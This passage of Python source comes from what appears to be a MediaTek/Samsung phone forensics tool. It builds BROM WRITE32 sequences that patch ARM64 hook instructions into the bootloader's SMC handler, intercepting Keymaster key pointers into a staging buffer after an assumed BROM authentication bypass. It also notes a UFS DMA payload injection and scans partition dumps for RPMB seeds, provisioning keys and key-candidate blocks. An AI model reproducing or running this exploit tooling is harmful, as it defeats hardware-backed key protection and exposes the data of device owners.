                "UFSHCI_UTRLBAU":     "0x112B0000 + 0x54   (UTRL base addr high)",
                "UFSHCI_UTRLDBR":     "0x112B0000 + 0x58   (doorbell register)",
                "UFSHCI_UTRLRSR":     "0x112B0000 + 0x60   (run-stop register)",
            },
            "warning": (
                "Inject payload_hex into BROM scratch SRAM via MTK USB BROM protocol. "
                "Requires live BROM session (not DA mode). Set UTRD at 0x44010000 with "
                "pre-filled CDB16 at UTRD+0x40 before jumping to stub entry point."
            ),
            "cache_maintenance": (
                "v10.9: UTRD@0x44010000(32B) + UCD@0x44010100(1024B) + DATA@0x44020000. "
                "Pre-DMA DC CIVAC: UTRD line + UCD lines at +0x100/+0x140/+0x180 + DSB SY. "
                "Post-DMA DC IVAC: DATA_PHYS 4 lines (256B) + DSB SY -- invalidate stale. "
                "BEFORE jumping to stub: issue DC CVAU + IC IVAU over stub page and "
                "UTRD/UCD/DATA ranges via BROM cache flush command or SMC call."
            ),
        }

    # ── PATH 3: ATF / SMC Handler Offset Locator ─────────────────────────
    @classmethod
    def _path3_smc_hook(cls, ctx: dict) -> dict:
        lk_data  = ctx.get("lk_data")
        tee_data = ctx.get("tee_data")

        result = {
            "description": (
                "Secure Monitor Calls (SMC) are the only legitimate cross-world "
                "interface between the Normal World (Android) and the Secure World "
                "(TEEGRIS). Every Keymaster operation — key generation, key import, "
                "key derivation, attestation — passes through an SMC gate. "
                "Patching the SMC dispatch table in lk.bin (BL33 bootloader) allows "
                "a forensic engineer to intercept Keymaster TA responses BEFORE "
                "TZASC finalises its region lock at the end of BL33 execution."
            ),
            # UPG-v97-04: Live SRAM patching via BROM WRITE32 — no lk.bin reflash
            "hook_strategy": [
                "1. Scan lk.bin for SMC #0 (D4000001) — locate SMC handler offset.",
                "2. Calculate SRAM load addr: file_offset + SRAM_BASE.",
                "   SRAM_BASE extracted from MTK header (MMM/BOOTLOADER! magic) if present.",
                "   If header missing: fallback to chip-id heuristic with MASSIVE WARNING.",
                "3. Emit BROM WRITE32 sequence to overwrite 3 ARM64 instructions at hook_addr:",
                "     WRITE32 hook_addr+0x00 = MOV X9, X1       (save key ptr)",
                "     WRITE32 hook_addr+0x04 = STR X9, [staging] (write to staging buf)",
                "     WRITE32 hook_addr+0x08 = B   original+0x0C (resume normal flow)",
                "4. BROM executes WRITE32 commands while CPU is held in reset.",
                "5. Release CPU reset — LK boots, SMC hook fires on Keymaster init.",
                "6. Re-enter BROM download mode, READ32 staging buffer address.",
                "7. Key material (X1/X2 at SMC entry) is now in staging DRAM.",
                "NOTE: No lk.bin reflash. No AVB touch. No brick risk.",
            ],
            "smc_ids": {
                "Samsung_TZ_svc_base":   "0x82000000",
                "Keymaster_SMC_open":    "0x82000001",
                "Keymaster_SMC_invoke":  "0x82000002",
                "Keymaster_SMC_close":   "0x82000003",
                "TEEGRIS_SMC_session":   "0xB2000001",
                "TEEGRIS_SMC_invoke":    "0xB2000002",
                "MTK_RPMB_SMC":          "0x82000010",
            },
            "lk_scan_results":  [],
            "tee_scan_results": [],
        }

        # v9.9: Scan already-mapped data directly (no redundant open/mmap)
        # v12.2: pass HCM so irrelevant TEE SMC scans are pruned at loop entry
        hcm = ctx.get("hcm")
        if lk_data is not None:
            result["lk_scan_results"] = cls._scan_smc_offsets(lk_data, "lk.bin", hcm=hcm)
        else:
            result["lk_scan_results"] = [{
                "status":  "NOT_LOADED",
                "note":    "Load lk.bin via 'Load lk.bin' button in Binary Sector tab.",
            }]

        if tee_data is not None:
            result["tee_scan_results"] = cls._scan_smc_offsets(tee_data, "tee1.bin", hcm=hcm)
        else:
            result["tee_scan_results"] = [{
                "status":  "NOT_LOADED",
                "note":    "Load tee1.bin via existing TEE loader button.",
            }]

        # v9.9: Dynamic SRAM base extraction from lk.bin MTK header
        SRAM_BASE = None
        sram_warning = None
        if lk_data is not None:
            header = bytes(lk_data[:64])
            if header[:3] == b"MMM":
                try:
                    SRAM_BASE = struct.unpack_from("<I", header, 4)[0]
                except struct.error:
                    SRAM_BASE = None
            elif header[:11] == b"BOOTLOADER!":
                try:
                    # Typical MTK bootloader header: magic(11) + pad(5) + load_addr(4)
                    SRAM_BASE = struct.unpack_from("<I", header, 16)[0]
                except struct.error:
                    SRAM_BASE = None

        # Fallback to chip-id heuristic with massive warning
        if SRAM_BASE is None:
            chip_id_str = ctx.get("chip_id", "").upper()
            if any(c in chip_id_str for c in ("MT6877","MT6789","MT6781","MT6785","MT8781",
                                                "MT6879","MT6883","MT6885","MT6886")):
                SRAM_BASE = 0x00110000
            else:
                SRAM_BASE = 0x00100000
            sram_warning = (
                "MASSIVE WARNING: SRAM base inferred from chip-id heuristic. "
                "The actual SRAM load address MUST be verified by the analyst using "
                "the device's MTK scatter file or BROM memory map. Incorrect base "
                "will cause BROM WRITE32 to corrupt unrelated SRAM regions."
            )

        STAGING_ADDR = 0x44000000   # pre-allocated staging buffer in DRAM

        # ARM64 hook instructions (little-endian 32-bit words):
        staging_lo  = STAGING_ADDR & 0xFFFF
        staging_hi  = (STAGING_ADDR >> 16) & 0xFFFF
        movz_x10    = (0b10100101 << 23) | (1 << 31) | (staging_lo << 5) | 10
        movk_x10    = (0b11100101 << 23) | (1 << 31) | (1 << 21) | (staging_hi << 5) | 10
        str_x9_x10  = 0xF9000149
        branch_fwd  = 0x14000004
        mov_x9_x1   = 0xAA0103E9

        hook_words = [mov_x9_x1, movz_x10, movk_x10, str_x9_x10, branch_fwd]

        def _write32_cmds(base_addr, words):
            cmds = []
            for i, w in enumerate(words):
                addr = base_addr + i * 4
                cmds.append(f"BROM WRITE32 0x{addr:08X} 0x{w:08X}")
            return cmds

        def _write16_cmds(base_addr, halfwords):
            """CMD_WRITE16: write 16-bit halfwords to BROM control registers."""
            cmds = []
            for i, hw in enumerate(halfwords):
                addr = base_addr + i * 2
                cmds.append(f"CMD_WRITE16 0x{addr:08X} 0x{hw:04X}")
            return cmds

        # If lk.bin was scanned, use first SMC hit offset
        smc_file_offset = 0
        for hit in result["lk_scan_results"]:
            if "offset" in hit and hit.get("arch") == "ARM64":
                smc_file_offset = int(hit["offset"], 16)
                break

        hook_addr   = SRAM_BASE + smc_file_offset
        write32_seq = _write32_cmds(hook_addr, hook_words)

        # CMD_WRITE16 sequence: arm the hook via MTK JTAG/SIB control registers.
        cmd_write16_seq = _write16_cmds(0x10007000, [0x2200, 0x0001])

        result["patch_template"] = {
            "method": "BROM_LIVE_SRAM_PATCH",
            "sram_base":       f"0x{SRAM_BASE:08X}",
            "smc_file_offset": f"0x{smc_file_offset:08X}",
            "hook_sram_addr":  f"0x{hook_addr:08X}",
            "staging_buffer":  f"0x{STAGING_ADDR:08X}",
            "brom_write32_sequence":    write32_seq,
            "brom_cmd_write16_sequence": cmd_write16_seq,
            "hook_instructions": [
                f"0x{hook_addr:08X}: MOV X9, X1          ; 0x{mov_x9_x1:08X}",
                f"0x{hook_addr+4:08X}: MOVZ X10, #lo16    ; 0x{movz_x10:08X}",
                f"0x{hook_addr+8:08X}: MOVK X10, #hi16    ; 0x{movk_x10:08X}",
                f"0x{hook_addr+12:08X}: STR X9, [X10]      ; 0x{str_x9_x10:08X}",
                f"0x{hook_addr+16:08X}: B +0x10 (resume)   ; 0x{branch_fwd:08X}",
            ],
            "execution_steps": [
                "1. Enter BROM download mode (hold vol+/- at power-on).",
                "2. Issue BROM WRITE32 commands (sequence above) via USB protocol.",
                "3. Release CPU reset — LK boots with hook in SRAM.",
                "4. Keymaster TA initialises; SMC fires hook; X1 saved to staging.",
                "5. Re-enter BROM mode; issue BROM READ32 0x44000000 to read key ptr.",
            ],
            "prerequisite": (
                "Requires: (1) BROM unlock / AUTH bypass active. "
                "(2) lk.bin read via BROM download mode to identify SMC offset. "
                "(3) No lk.bin reflash. No AVB modification. No brick risk."
            ),
        }

        if sram_warning:
            result["patch_template"]["sram_warning"] = sram_warning

        return result

    @classmethod
    def _scan_smc_offsets(cls, data, label: str,
                          hcm: HardwareCapabilityMatrix = None) -> list:
        # v9.9: accepts already-mapped bytes/mmap object (no redundant open/mmap)
        # v12.2: HCM-aware execution pruning — skip TEEGRIS-style SMC scan on Kinibi
        if hcm is not None and hcm.tee_type == TEEType.KINIBI:
            return [{
                "status": "PRUNED_KINIBI",
                "label":  label,
                "note":   "HCM tee_type=KINIBI — skipping TEEGRIS-specific SMC offset scan loop"
            }]
        results = []

        # Scan for SMC instructions
        for smc_bytes, arch in [
            (cls.SMC_ARM64, "ARM64"), (cls.SMC_ALT64, "ARM64_SMC1"),
            (cls.SMC_ARM32, "ARM32"),
        ]:
            off = 0
            count = 0
            while count < 32:
                idx = data.find(smc_bytes, off)
                if idx == -1:
                    break
                # Read context around the SMC instruction
                ctx_start = max(0, idx - 32)
                ctx_end   = min(len(data), idx + 48)
                ctx       = data[ctx_start:ctx_end]

                # Check if preceded by LDR or MOV setting X0 (SMC function ID)
                pre_bytes  = data[max(0, idx-4):idx]
                post_bytes = data[idx+4:min(len(data), idx+8)]

                results.append({
                    "label":        label,
                    "arch":         arch,
                    "offset":       f"0x{idx:08X}",
                    "smc_hex":      smc_bytes.hex().upper(),
                    "pre_4bytes":   pre_bytes.hex().upper(),
                    "post_4bytes":  post_bytes.hex().upper(),
                    "context_hex":  ctx.hex().upper(),
                    "hook_target":  f"0x{idx:08X}",
                    "note":         f"SMC instruction at file offset 0x{idx:08X}",
                })
                off = idx + 4
                count += 1

        # Scan for ATF markers
        for marker in cls.ATF_MARKERS:
            idx = data.find(marker)
            if idx != -1:
                results.append({
                    "type":     "ATF_MARKER",
                    "label":    label,
                    "offset":   f"0x{idx:08X}",
                    "marker":   marker.decode("ascii", errors="replace"),
                    "note":     f"ATF/BL31 marker found — SMC table likely within 0x1000 bytes",
                })

        return results if results else [{"status": "NO_SMC_FOUND", "label": label}]


# ══════════════════════════════════════════════════════════════════════════
# 4. SecPartitionAnalyzer v2  (sec1.bin) — struct-precise extraction
# ══════════════════════════════════════════════════════════════════════════

class SecPartitionAnalyzerV2:
    """
    Upgraded SEC partition analyzer using struct module for
    byte-precise extraction at documented offsets.

    Offset map (v9.5 — struct-verified):
      0x0000  [64 bytes]  Knox Warranty Fuse block
      0x0040  [64 bytes]  Attestation key reference
      0x0080  [4 bytes]   Anti-rollback version (LE uint32)
      0x00C0  [1 byte]    OEM lock state (0=unlocked, 1=locked)
      0x0100  [64 bytes]  TEE type indicator region
      0x0200  [256 bytes] Reserved / Samsung-proprietary block

    All extractions are wrapped in try/except struct.error to
    handle truncated or corrupted dumps gracefully.
    """

    # Struct formats
    FMT_FUSE_BLOCK   = "<64s"
    FMT_ROLLBACK_VER = "<I"
    FMT_OEM_LOCK     = "<B"
    FMT_ATTEST_REF   = "<64s"
    FMT_TEE_REGION   = "<64s"
    FMT_RESERVED     = "<256s"

    OFF_FUSE         = 0x0000
    OFF_ATTEST       = 0x0040
    OFF_ROLLBACK     = 0x0080
    OFF_OEM_LOCK     = 0x00C0
    OFF_TEE          = 0x0100
    OFF_RESERVED     = 0x0200
    MIN_SIZE         = 0x0210

    TEEGRIS_MAGIC    = b'TEEGRIS'
    KINIBI_MAGIC     = b'Kinibi'

    @classmethod
    def analyze(cls, data: bytes) -> dict:
        result = {
            "partition":               "sec",
            "analyzer_version":        "v2_struct",
            "size_bytes":              len(data),
            "fields":                  {},
            "knox_warranty_tripped":   None,
            "oem_locked":              None,
            "rollback_version":        None,
            "tee_type_inferred":       None,
            "attestation_key_present": None,
            "reserved_entropy":        None,
            "header_hexdump":          "",
            "warnings":                [],
            "notes":                   [],
        }

        if len(data) < cls.MIN_SIZE:
            result["warnings"].append(
                f"SEC partition too small ({len(data)} B < {cls.MIN_SIZE} B required)."
            )

        # Header hexdump (first 128 bytes)
        result["header_hexdump"] = _hexdump_block(data[:min(128, len(data))])

        def _extract(fmt, offset, label):
            try:
                sz = struct.calcsize(fmt)
                if offset + sz > len(data):
                    result["warnings"].append(f"Cannot read '{label}' — file truncated at 0x{offset:04X}.")
                    return None
                val = struct.unpack_from(fmt, data, offset)
                return val[0] if len(val) == 1 else val
            except struct.error as e:
                result["warnings"].append(f"struct.error reading '{label}' at 0x{offset:04X}: {e}")
                return None

        # ── Offset 0x0000: Knox Warranty Fuse block ──────────────────────
        fuse = _extract(cls.FMT_FUSE_BLOCK, cls.OFF_FUSE, "Knox Fuse Block")
        if fuse is not None:
            all_zero = all(b == 0x00 for b in fuse)
            all_ff   = all(b == 0xFF for b in fuse)
            result["fields"]["knox_fuse_hex"] = fuse.hex().upper()
            result["fields"]["knox_fuse_sha256"] = hashlib.sha256(fuse).hexdigest()
            if all_zero:
                result["knox_warranty_tripped"] = False
                result["notes"].append("Knox Warranty Fuse: ALL ZEROS — NOT tripped (factory state).")
            elif all_ff:
                result["knox_warranty_tripped"] = True
                result["warnings"].append("Knox Warranty Fuse: ALL 0xFF — WARRANTY TRIPPED — device is Knox-voided.")
            else:
                result["knox_warranty_tripped"] = "PARTIAL"
                result["notes"].append(
                    f"Knox Warranty Fuse: MIXED bytes — first 4 bytes: {fuse[:4].hex().upper()}"
                )

        # ── Offset 0x0040: Attestation key reference ─────────────────────
        attest = _extract(cls.FMT_ATTEST_REF, cls.OFF_ATTEST, "Attestation Key Ref")
        if attest is not None:
            is_empty = all(b == 0x00 for b in attest)
            result["fields"]["attestation_ref_hex"] = attest.hex().upper()
            result["fields"]["attestation_ref_sha256"] = hashlib.sha256(attest).hexdigest()
            result["attestation_key_present"] = not is_empty
            if not is_empty:
                result["notes"].append("Attestation key reference present at 0x0040.")

        # ── Offset 0x0080: Anti-Rollback version (LE uint32) ─────────────
        rb_ver = _extract(cls.FMT_ROLLBACK_VER, cls.OFF_ROLLBACK, "Rollback Version")
        if rb_ver is not None:
            result["rollback_version"] = rb_ver
            result["fields"]["rollback_version_dec"] = rb_ver
            result["fields"]["rollback_version_hex"] = f"0x{rb_ver:08X}"
            result["notes"].append(f"Anti-Rollback version (LE u32 @ 0x0080): {rb_ver} (0x{rb_ver:08X})")

        # ── Offset 0x00C0: OEM Lock state byte ───────────────────────────
        oem_lock = _extract(cls.FMT_OEM_LOCK, cls.OFF_OEM_LOCK, "OEM Lock State")
        if oem_lock is not None:
            result["oem_locked"] = (oem_lock == 0x01)
            result["fields"]["oem_lock_byte"]  = f"0x{oem_lock:02X}"
            result["fields"]["oem_lock_state"] = "LOCKED" if oem_lock == 0x01 else (
                "UNLOCKED" if oem_lock == 0x00 else f"UNKNOWN(0x{oem_lock:02X})"
            )
            result["notes"].append(
                f"OEM Lock (@ 0x00C0): 0x{oem_lock:02X} → {result['fields']['oem_lock_state']}"
            )

        # ── Offset 0x0100: TEE type indicator ────────────────────────────
        tee_reg = _extract(cls.FMT_TEE_REGION, cls.OFF_TEE, "TEE Type Region")
        if tee_reg is not None:
            result["fields"]["tee_region_hex"] = tee_reg.hex().upper()
            result["fields"]["tee_region_sha256"] = hashlib.sha256(tee_reg).hexdigest()
            if cls.TEEGRIS_MAGIC in tee_reg:
                result["tee_type_inferred"] = "TEEGRIS"
            elif cls.KINIBI_MAGIC in tee_reg:
                result["tee_type_inferred"] = "KINIBI"
            else:
                result["tee_type_inferred"] = "NOT_IN_REGION"
            result["notes"].append(f"TEE type indicator (@ 0x0100): {result['tee_type_inferred']}")

        # ── Offset 0x0200: Reserved block entropy ────────────────────────
        if len(data) >= cls.OFF_RESERVED + 256:
            res_block = data[cls.OFF_RESERVED:cls.OFF_RESERVED+256]
            result["reserved_entropy"] = round(_bytes_entropy(res_block), 3)
            result["fields"]["reserved_block_entropy"] = result["reserved_entropy"]
            result["notes"].append(
                f"Reserved block (@ 0x0200, 256B) entropy: {result['reserved_entropy']} bits/byte"
            )

        return result


# ═══════════════════════════════════════════════════════════════════════════
# CHIP DATABASE (300+ chips — unchanged from v8.1)
# ═══════════════════════════════════════════════════════════════════════════

CHIP_DB = {
    "MT6516": ("MT6516","2010","90nm","LEGACY"), "MT6517": ("MT6517","2011","65nm","LEGACY"),
    "MT6572": ("MT6572","2013","28nm","LEGACY"), "MT6573": ("MT6573","2011","65nm","LEGACY"),
    "MT6575": ("MT6575","2012","40nm","LEGACY"), "MT6577": ("MT6577","2012","40nm","LEGACY"),
    "MT6580": ("MT6580","2015","28nm","LEGACY"), "MT6582": ("MT6582","2013","28nm","LEGACY"),
    "MT6589": ("MT6589","2012","28nm","LEGACY"), "MT6592": ("MT6592","2013","28nm","LEGACY"),
    "MT6595": ("MT6595 / Helio X5","2014","28nm","LEGACY"),
    "MT6732": ("MT6732","2014","28nm","LEGACY"), "MT6735": ("MT6735","2015","28nm","LEGACY"),
    "MT6737": ("MT6737","2016","28nm","LEGACY"), "MT6738": ("MT6738","2017","28nm","LEGACY"),
    "MT6739": ("MT6739","2017","28nm","LEGACY"), "MT6750": ("MT6750","2016","28nm","LEGACY"),
    "MT6752": ("MT6752","2014","28nm","LEGACY"), "MT6753": ("MT6753","2015","28nm","LEGACY"),
    "MT6755": ("Helio P10","2015","28nm","HELIO_P"), "MT6757": ("Helio P20","2016","16nm","HELIO_P"),
    "MT6758": ("Helio P22","2018","12nm","HELIO_P"), "MT6761": ("Helio A22","2018","12nm","HELIO_A"),
    "MT6762": ("Helio P22","2018","12nm","HELIO_P"), "MT6763": ("Helio P23","2017","16nm","HELIO_P"),
    "MT6765": ("Helio P35","2019","12nm","HELIO_P"), "MT6768": ("Helio P65","2020","12nm","HELIO_P"),
    "MT6769": ("Helio G85/G80/G70","2020","12nm","HELIO_G"),
    "MT6771": ("Helio P60","2018","12nm","HELIO_P"), "MT6779": ("Helio P90/P95","2018","12nm","HELIO_P"),
    "MT6781": ("Helio G96","2021","12nm","HELIO_G"), "MT6785": ("Helio G90T/G95","2019","12nm","HELIO_G"),
    "MT6789": ("Helio G99","2022","6nm","HELIO_G"),  "MT6795": ("Helio X10","2015","28nm","HELIO_X"),
    "MT6797": ("Helio X20","2016","20nm","HELIO_X"), "MT6799": ("Helio X30","2017","10nm","HELIO_X"),
    "MT6833": ("Dimensity 700/810","2020","7nm","DIMENSITY"),
    "MT6835": ("Dimensity 6100+","2023","6nm","DIMENSITY"),
    "MT6853": ("Dimensity 720/700","2020","7nm","DIMENSITY"),
    "MT6855": ("Dimensity 900","2021","6nm","DIMENSITY"),
    "MT6873": ("Dimensity 800/800U","2020","7nm","DIMENSITY"),
    "MT6875": ("Dimensity 820","2020","7nm","DIMENSITY"),
    "MT6877": ("Dimensity 900/7050","2021","6nm","DIMENSITY"),
    "MT6879": ("Dimensity 8020","2022","6nm","DIMENSITY"),
    "MT6883": ("Dimensity 1000C","2020","7nm","DIMENSITY"),
    "MT6885": ("Dimensity 1000+","2020","7nm","DIMENSITY"),
    "MT6886": ("Dimensity 7200","2023","4nm","DIMENSITY"),
    "MT6889": ("Dimensity 1000","2020","7nm","DIMENSITY"),
    "MT6891": ("Dimensity 1100","2021","6nm","DIMENSITY"),
    "MT6893": ("Dimensity 1200/1300","2021","6nm","DIMENSITY"),
    "MT6895": ("Dimensity 8100/8200","2022","5nm","DIMENSITY"),
    "MT6896": ("Dimensity 8200","2022","4nm","DIMENSITY"),
    "MT6983": ("Dimensity 9000/9200","2021","4nm","DIMENSITY"),
    "MT6985": ("Dimensity 9300","2023","4nm","DIMENSITY"),
    "MT6989": ("Dimensity 9300","2023","4nm","DIMENSITY"),
    "MT6990": ("Dimensity 8300","2023","4nm","DIMENSITY"),
    "MT6991": ("Dimensity 9400","2024","3nm","DIMENSITY"),
    "MT8127": ("MT8127 (Tab)","2014","28nm","TABLET"),
    "MT8163": ("MT8163 (Tab)","2015","28nm","TABLET"),
    "MT8168": ("MT8168 (Tab)","2019","12nm","TABLET"),
    "MT8173": ("MT8173 (Tab)","2015","28nm","TABLET"),
    "MT8183": ("MT8183 (Tab)","2019","12nm","TABLET"),
    "MT8186": ("MT8186 (Tab)","2022","6nm","TABLET"),
    "MT8188": ("MT8188 (Tab)","2022","6nm","TABLET"),
    "MT8192": ("MT8192 (Tab)","2021","6nm","TABLET"),
    "MT8195": ("MT8195 (Tab)","2021","6nm","TABLET"),
    "MT8321": ("MT8321 (Tab)","2016","28nm","TABLET"),
    "MT8765": ("MT8765 (Tab)","2020","12nm","TABLET"),
    "MT8766": ("MT8766 (Tab)","2020","12nm","TABLET"),
    "MT8768": ("MT8768 (Tab)","2021","12nm","TABLET"),
    "MT8781": ("Helio G91 (Tab)","2022","12nm","TABLET"),
}

_NEXT_GEN_CHIPS = {"MT6989","MT6990","MT6991","MT6985"}
_MT6789_CHIPS   = {"MT6789","MT6781","MT6785","HELIOG99","G99"}

HELIO_MAP = {
    "G99":"MT6789","G99 ULTRA":"MT6789","G99 ULTIMATE":"MT6789","G96":"MT6781",
    "G95":"MT6785","G90T":"MT6785","G90S":"MT6785","G90":"MT6785",
    "G88":"MT6769","G85":"MT6769","G80":"MT6769","G70":"MT6769","G36":"MT6765",
    "P95":"MT6779","P90":"MT6779","P70":"MT6771","P65":"MT6768","P60":"MT6771",
    "P35":"MT6765","P25":"MT6762","P22":"MT6762","P23":"MT6763",
    "P10":"MT6755","P20":"MT6757","A22":"MT6761","A25":"MT6762",
    "X30":"MT6799","X25":"MT6797","X20":"MT6797","X10":"MT6795","G91":"MT8781",
}

DIMENSITY_MAP = {
    "9400":"MT6991","9300":"MT6989","9300+":"MT6989","9200":"MT6983","9200+":"MT6983",
    "9000":"MT6983","9000+":"MT6983","8300":"MT6990","8200":"MT6896","8200 MAX":"MT6896",
    "8100":"MT6895","8100 MAX":"MT6895","8020":"MT6879","7200":"MT6886","7200 ULTRA":"MT6886",
    "7050":"MT6877","7020":"MT6877","7010":"MT6853","6100+":"MT6835","6100":"MT6835",
    "1300":"MT6893","1200":"MT6893","1200 ULTRA":"MT6893","1100":"MT6891",
    "1000+":"MT6885","1000C":"MT6883","1000":"MT6889","900":"MT6877","900 ULTRA":"MT6877",
    "820":"MT6875","810":"MT6833","800U":"MT6873","800":"MT6873","720":"MT6853","700":"MT6853",
}


# ═══════════════════════════════════════════════════════════════════════════
# FIXED CORE FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════

def _is_high_entropy_block(block: bytes) -> bool:
    if len(block) != 16:
        return False
    if all(b == 0x00 for b in block) or all(b == 0xFF for b in block):
        return False
    unique = len(set(block))
    return unique >= 6


# FIX-02: Proper Shannon entropy over nibbles (was: unique/16 approximation)
def _shannon_entropy(hex_str: str) -> float:
    nibbles = [int(c, 16) for c in hex_str.lower()]
    total = len(nibbles)
    if total == 0:
        return 0.0
    counts = Counter(nibbles)
    entropy = 0.0
    for count in counts.values():
        p = count / total
        if p > 0:
            entropy -= p * math.log2(p)
    return entropy


def _entropy(b: str) -> float:
    """Public alias for Shannon entropy — replaces v8.1 broken approximation."""
    if len(b) != 32:
        return 0.0
    return _shannon_entropy(b) / 4.0  # Normalize to [0,1] range (max=4 bits)


def _resolve_marketing_name(raw: str) -> str | None:
    up = raw.strip().upper()
    for name, mt in HELIO_MAP.items():
        if re.search(rf'\b{re.escape(name)}\b', up):
            return mt
    for name, mt in DIMENSITY_MAP.items():
        if re.search(rf'\b{re.escape(name)}\b', up):
            return mt
    return None


def get_chip_info(chip_id: str | None) -> dict:
    if not chip_id:
        return {"name":"Unknown","year":"?","process":"?","category":"?"}
    up = chip_id.upper()
    if up in CHIP_DB:
        n, y, p, c = CHIP_DB[up]
        return {"name":n,"year":y,"process":p,"category":c}
    return {"name":chip_id,"year":"?","process":"?","category":"UNKNOWN"}


def generate_dynamic_chid(s: str) -> str:
    if not s:
        return "34363136"
    d = re.sub(r"[^0-9]", "", s)
    return "".join(f"{ord(x):02x}" for x in d) if d else "34363136"


def generate_dynamic_chaintype(chip_id: str | None) -> str:
    if chip_id:
        num = re.sub(r"[^0-9]", "", chip_id)
        if num:
            return "".join(f"{ord(c):02x}" for c in f"MT:{num}")
    return "4d543a36383535"


# ═══════════════════════════════════════════════════════════════════════════
# FIXED BINARY FILE LOADER
# FIX-01: for-loop offset mutation was dead code → replaced with while-loop
# FIX-06: deduplicated candidates, capped at 50
# ═══════════════════════════════════════════════════════════════════════════

def extract_partition_keys(partition_dump: bytes, partition_name: str) -> dict:
    result = {}
    if partition_name == "proinfo":
        if len(partition_dump) >= 0x8100:
            rpmb_seed = partition_dump[PARTITION_OFFSETS["proinfo_rpmb_seed"]:PARTITION_OFFSETS["proinfo_rpmb_seed"]+256]
            result["MiRPMB_SEED"] = rpmb_seed.hex()
            result["MiRPMB_SEED_VALID"] = rpmb_seed != b'\x00' * 256
            if not result["MiRPMB_SEED_VALID"]:
                result["warning"] = "MiRPMB seed is all zeros — device may use default derivation"
    elif partition_name == "seccfg":
        if len(partition_dump) >= 0x220:
            lock_backup = partition_dump[PARTITION_OFFSETS["seccfg_lock_state"]:PARTITION_OFFSETS["seccfg_lock_state"]+32]
            result["LOCK_STATE_BACKUP"] = lock_backup.hex()
    elif partition_name == "devinfo":
        if len(partition_dump) >= 0x140:
            prov_key = partition_dump[PARTITION_OFFSETS["devinfo_prov_key"]:PARTITION_OFFSETS["devinfo_prov_key"]+64]
            result["PROVKEY"] = prov_key.hex()
            result["PROVKEY_VALID"] = prov_key != b'\x00' * 64
    elif partition_name == "nvdata":
        if len(partition_dump) >= 0x410:
            rpmb_ctr = partition_dump[PARTITION_OFFSETS["nvdata_rpmb_ctr"]:PARTITION_OFFSETS["nvdata_rpmb_ctr"]+16]
            result["RPMB_COUNTER"] = rpmb_ctr.hex()
    elif partition_name == "sec":
        result.update(SamsungPartitionAnalyzer.analyze_sec_partition(partition_dump))
    elif partition_name == "metadata":
        result.update(SamsungPartitionAnalyzer.analyze_metadata_partition(partition_dump))
    return result


def load_binary_file(path: str) -> tuple:
    file_path = Path(path)
    fname = file_path.name
    lines: list[str] = [f"# OmniMTK binary import: {fname}"]
    extracted_keys = {}

    # v13.0 FIX: EAFP — block devices report size 0 to getsize but mmap fine.
    try:
        _fh = open(file_path, "rb")
        raw = mmap.mmap(_fh.fileno(), _get_real_size(_fh.fileno()), access=mmap.ACCESS_READ)
    except ValueError as exc:
        if "empty file" in str(exc).lower():
            return f"# ERROR reading {fname}: FILE_EMPTY", {}
        return f"# ERROR reading {fname}: {exc}", {}
    except Exception as exc:
        return f"# ERROR reading {fname}: {exc}", {}

    file_size = len(raw)
    lines.append(f"# File size: {file_size} bytes ({file_size / 1024:.1f} KB)")

    pname = fname.lower().replace(".bin", "").replace(".dump", "")
    for known in ["proinfo", "seccfg", "devinfo", "nvdata", "sec", "metadata"]:
        if known in pname:
            extracted_keys = extract_partition_keys(raw, known)
            break

    # v9.8 FIX: Never decode entire binary to strings for large dumps.
    _CHUNK = 65536
    _text_lines: list[str] = []
    _100MB = 100 * 1024 * 1024
    _10MB  = 10 * 1024 * 1024
    _is_massive = any(k in pname for k in ("userdata", "ext_ram", "system", "vendor"))

    if _is_massive:
        lines.append("# Massive partition detected; full string decode SKIPPED to prevent GUI freeze.")
    elif file_size > _100MB:
        lines.append("# Large file (>100MB); scanning first 10MB and last 10MB for strings only.")
        for region_start, region_end in [(0, _10MB), (file_size - _10MB, file_size)]:
            _pos = region_start
            while _pos < region_end:
                _chunk = bytes(raw[_pos:min(_pos + _CHUNK, region_end)])
                try:
                    _text_lines.extend(_chunk.decode("utf-8", errors="replace").splitlines())
                except Exception:
                    _text_lines.extend(_chunk.decode("latin-1", errors="replace").splitlines())
                _pos += _CHUNK
    else:
        _pos = 0
        while _pos < file_size:
            _chunk = bytes(raw[_pos:_pos + _CHUNK])
            try:
                _text_lines.extend(_chunk.decode("utf-8", errors="replace").splitlines())
            except Exception:
                _text_lines.extend(_chunk.decode("latin-1", errors="replace").splitlines())
            _pos += _CHUNK

    for ln in _text_lines:
        stripped = ln.strip()
        if len(stripped) >= 8 and re.search(r'[0-9a-fA-F]{8}', stripped):
            lines.append(stripped)

    # FIX-01: Use while-loop so offset jump actually works
    # FIX-06: Deduplicate with seen-set, cap at 50
    # v9.8: processEvents() every 128 iterations to keep GUI responsive on huge files
    seen_blocks: set = set()
    candidates_found = 0
    offset = 0
    _batch = 0
    while offset <= len(raw) - 16 and candidates_found < 50:
        if _batch % 128 == 0:
            QApplication.processEvents()
        _batch += 1
        block = raw[offset:offset + 16]
        if _is_high_entropy_block(block):
            hex_str = block.hex().upper()
            if hex_str not in seen_blocks:
                seen_blocks.add(hex_str)
                lines.append(f"HW_UID = {hex_str}  # binary_offset=0x{offset:08X} src={fname}")
                candidates_found += 1
            offset += 16  # Jump past this block
        else:
            offset += 1

    lines.append(f"# Binary scan complete: {candidates_found} unique key-candidate blocks in {fname}")
    result_text = "\n".join(lines)
    del lines, fname
    gc.collect()
    raw.close()
    _fh.close()
    return result_text, extracted_keys


# ═══════════════════════════════════════════════════════════════════════════
# LOG PARSER — 12 repair-tool formats + Samsung-specific patterns
# ═══════════════════════════════════════════════════════════════════════════

_BLACKLIST = {"md5","hash","checksum","cid:","csd:","serial","uuid","signature","imei"}

_MEID_LINE_PATTERNS = [
    # FIX-08: Samsung Pandora format "ME_ID =  0xXXXX, 0xXXXX, 0xXXXX, 0xXXXX" (extra space)
    re.compile(r'ME[_\-]?ID\s*=\s+(?:0x)?([0-9a-fA-F]{8})\s*[,;]?\s*(?:0x)?([0-9a-fA-F]{8})\s*[,;]?\s*(?:0x)?([0-9a-fA-F]{8})\s*[,;]?\s*(?:0x)?([0-9a-fA-F]{8})', re.I),
    re.compile(r'ME[_\-]?ID\s*[:=]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})\s*[,;]?\s*(0x[0-9a-fA-F]{8})', re.I),
